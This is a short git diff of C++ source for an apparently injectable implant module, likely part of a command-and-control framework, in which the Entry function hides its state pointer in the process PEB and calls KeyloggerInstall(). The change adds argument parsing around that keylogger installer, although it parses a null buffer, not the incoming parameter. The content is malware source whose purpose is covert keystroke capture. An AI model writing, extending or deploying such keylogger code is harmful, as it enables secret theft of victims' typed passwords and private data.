@@ -436,7 +436,10 @@ auto DECLFN LoadAdds( INSTANCE* Instance ) -> VOID {
 
 EXTERN_C
 auto DECLFN Entry( PVOID Parameter ) -> VOID {
+    PARSER   Psr = { 0 };
     INSTANCE Instance = { 0 };
+
+    PVOID ArgBuffer = nullptr;
 
     NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)&Instance;
 
@@ -447,13 +450,24 @@ auto DECLFN Entry( PVOID Parameter ) -> VOID {
 
     LoadEssentials( &Instance );
 
+    Parser::New(&Psr, ArgBuffer);
+
     HRESULT Result = S_OK;
 
     ULONG Length    = 0;
 
+    BYTE* Buffer = Parser::Bytes(&Psr, &Length);
+    CHAR* Arguments = Parser::Str(&Psr);
+    ULONG ArgumentsL = (Str::LengthA(Arguments) + 1) * sizeof(WCHAR);
+
     LoadAdds( &Instance );
+
+    WCHAR wArguments[MAX_PATH * 2] = { 0 };
+    Str::CharToWChar(wArguments, Arguments, ArgumentsL);
     
     Result = KeyloggerInstall();
+
+    Parser::Destroy(&Psr);
 
     if ( Instance.Ctx.ExecMethod == KH_METHOD_FORK && Instance.Ctx.ForkCategory == KH_INJECT_SPAWN ) {
         Instance.Win32.RtlExitUserProcess( Result );
